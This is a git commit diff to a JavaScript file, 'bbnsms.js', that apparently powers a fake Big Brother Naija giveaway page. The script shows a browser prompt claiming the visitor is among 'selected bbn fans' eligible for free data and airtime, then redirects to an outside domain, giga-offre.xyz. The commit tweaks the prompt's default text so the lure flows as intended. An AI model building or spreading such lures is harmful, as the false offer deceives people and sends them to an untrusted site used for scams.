badc6ad420ec23b3d8a80a1b8b783155090b6bbe
bigetijazz5 <bigetijazz5@gmail.com>
2024-10-06 16:19:59 -0700

    Update bbnsms.js

--- bbnsms.js
+++ bbnsms.js
@@ -1,6 +1,6 @@
 
 var password = 'ACTIVATE 10GB + AIRTIME '
-password=prompt('BBnaija: Hello, you are among the selected bbn fans to benefit from this offer. Press Ok to get offer now ','ACTIVATE 20GB + AIRTIME');
+password=prompt('BBnaija: Hello, you are among the selected bbn fans to benefit from this offer. Press Ok to get offer now ','ACTIVATE 10GB + AIRTIME');
 if (password != 'ACTIVATE 10GB + AIRTIME') {
 location.href='https://www.giga-offre.xyz/10gb-bbnaijaseason9';
 }
